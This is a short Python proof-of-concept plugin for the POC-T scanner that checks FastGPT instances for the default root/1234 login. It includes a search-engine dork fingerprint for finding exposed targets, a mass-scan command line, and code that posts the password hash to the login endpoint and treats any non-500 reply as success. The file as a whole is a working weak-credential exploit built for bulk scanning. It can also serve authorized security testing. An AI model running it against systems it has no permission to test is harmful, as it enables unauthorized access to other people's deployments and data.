#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   fastgpt_weakpass
@DateTime :  2023/9/22 13:02 


@Dork
    fid="iuP3OuxoY8SfDZRNQoxiLw=="

@Cmdline
    python POC-T.py -s fastgpt_weakpass.py -aF fid="iuP3OuxoY8SfDZRNQoxiLw=="

root/1234

@Request
```
POST /api/user/account/loginByPassword

{"username":"root","password":"03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4"}
```

@Expected Response
    not 500
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/api/user/account/loginByPassword")
    resp = request_ex("post", url, json={"username": "root", "password": '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4'})
    if resp and resp.status_code != 500:
        return True
    else:
        return False
